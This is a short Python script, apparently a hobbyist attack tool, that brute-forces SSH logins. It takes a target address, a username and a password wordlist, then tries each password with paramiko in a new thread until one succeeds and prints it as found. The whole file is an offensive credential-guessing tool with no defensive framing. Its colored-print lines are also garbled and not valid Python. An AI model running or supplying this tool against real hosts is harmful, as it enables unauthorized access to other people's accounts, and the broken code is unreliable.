import paramiko
import sys
import os
import socket
import threading
import time
import termcolor

stop_flag = 0


def ssh_connect(password):
    global stop_flag

    if stop_flag == 1:
        return

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=22, username=username, password=password)

        stop_flag = 1
        print(termcolor.colorgreen'[+] Password Found: ' + password + ' For Account: ' + username)

    except:
        print(termcolor.colorred'[-] Incorrect Password: ' + password)

    ssh.close()


host = input('[+] Target Address: ')
username = input('[+] Target Username: ')
input_file = input('[+] Path to Password List: ')

print('\n')

if os.path.exists(input_file) == False:
    print('[-] File Does Not Exist')
    sys.exit(1)


print('[+] Starting SSH Bruteforce Attack On ' + host + ' With Username: ' + username)


with open(input_file, 'r', errors="ignore") as file:

    for line in file.readlines():

        if stop_flag == 1:
            break

        password = line.strip()

        t = threading.Thread(target=ssh_connect, args=(password,))
        t.start()

        time.sleep(0.5)